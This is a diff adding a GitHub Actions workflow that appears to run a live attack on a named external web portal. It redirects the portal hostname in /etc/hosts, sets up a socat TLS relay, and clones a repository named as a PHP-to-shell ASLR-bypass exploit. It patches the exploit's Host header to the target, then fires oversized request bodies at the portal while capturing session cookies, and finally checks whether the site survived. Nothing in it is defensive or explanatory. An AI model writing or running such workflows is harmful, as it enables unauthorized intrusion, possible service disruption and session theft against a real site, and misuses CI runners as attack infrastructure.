@@ -1,0 +1,24 @@
+name: scale
+on: workflow_dispatch
+jobs:
+  s:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: setup
+        run: |
+          sudo sh -c 'echo "69.49.247.128 portal.mytasker.com" >> /etc/hosts'
+          sudo apt-get -qq update && sudo apt-get -qq install -y socat >/dev/null
+          sudo nohup socat TCP-LISTEN:8088,fork,reuseaddr OPENSSL:portal.mytasker.com:443 >/tmp/socat.log 2>&1 &
+          sleep 2
+          git clone -q https://github.com/9bie/php2shell-bypass-aslr-exp /tmp/p
+          sed -i 's/Host: 127.0.0.1:8088/Host: portal.mytasker.com/' /tmp/p/tools/send_a_oom5.py
+      - name: scale bodies
+        run: |
+          cd /tmp/p/tools
+          for BL in 45000 130000 260000; do
+            echo "=== BL=$BL (~$((235*BL/1024/1024))MB body)"
+            timeout 150 python3 send_a_oom5.py 0 62 235 $BL 208 0 4000 103 2>&1 | grep -aE "RESP_LEN|SETCOOKIE Set-Cookie: (PHPSESSID|ci_session)|recv_err" | cut -c1-90
+            sleep 3
+          done
+          echo "=== portal alive:"; curl -s -o /dev/null -w "%{http_code}\n" --max-time 15 https://portal.mytasker.com/index.php
